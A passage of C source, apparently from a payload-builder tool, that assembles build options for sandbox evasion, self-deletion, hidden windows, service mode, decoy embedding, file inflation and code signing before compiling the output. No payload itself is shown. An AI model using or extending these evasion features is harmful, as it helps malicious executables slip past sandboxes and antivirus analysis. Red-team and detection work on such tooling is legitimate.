			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "resolution");
	}

	if (sandboxFlag_processes) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "processes");
	}

	if (sandboxFlag_hardware) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "hardware");
	}

	if (sandboxFlag_mwfmoex) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "delay-mwfmoex");
	}

	if (sandboxFlag_ntdelay) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "ntdelay");
	}

	if (sandboxFlag_fibonacci) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "fibonacci");
	}


	//payload-control
	if (payloadFlag_control) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "check-running");
	}

	if (payloadFlag_selfdelete) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "self-delete");
	}

	


	//misc
	if (miscFlag_nowindow) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "no-window");
	}

	if (miscFlag_printf) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "no-print");
	}

	if (miscFlag_serviice) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "service");
	}


	if (miscFlag_dll) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "make-dll");

		// If export name was specified, add it as a define
		if (dllExportName != NULL) {
			char exportDefine[256];
			sprintf(exportDefine, " -DEXPORT_NAME=%s output\\code\\dll.h", dllExportName);
			strcat(compileFlags, exportDefine);
		}
	}

	if (miscFlag2_dll) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "make-dll");

		// If export name was specified, add it as a define
		if (dllExportName != NULL) {
			char exportDefine[256];
			sprintf(exportDefine, " -DEXPORT_NAME=%s output\\code\\dll.h", dllExportName);
			strcat(compileFlags, exportDefine);
		}
	}


	if (miscFlag_decoyFile) {

		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "decoy");


		embedDecoy(miscFlag_decoyFile);
	}

	if (miscFlag_inflate)
	{
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "inflate");
	}




	// Call compile with the appropriate flags

	if (compilerFlag_llvm)
	{
		compile_llvm(compileFlags);

	}
	else
	{
		compile_gcc(compileFlags);
	}


	//watermark and Resources
	if (!miscFlag_dll && !miscFlag2_dll) {
		watermark(argc, argv);
		addResources(argc, argv);

		
		if (signPfxFile != NULL) {
			sign(signPfxFile, signPassword);
		}

		if (inflateCount > 0 && !miscFlag_dll && !miscFlag2_dll) {
			inflate(argc, argv, inflateCount);
		}
	}



	// printing some gap
	printf("\n\n");

	return 0;
}
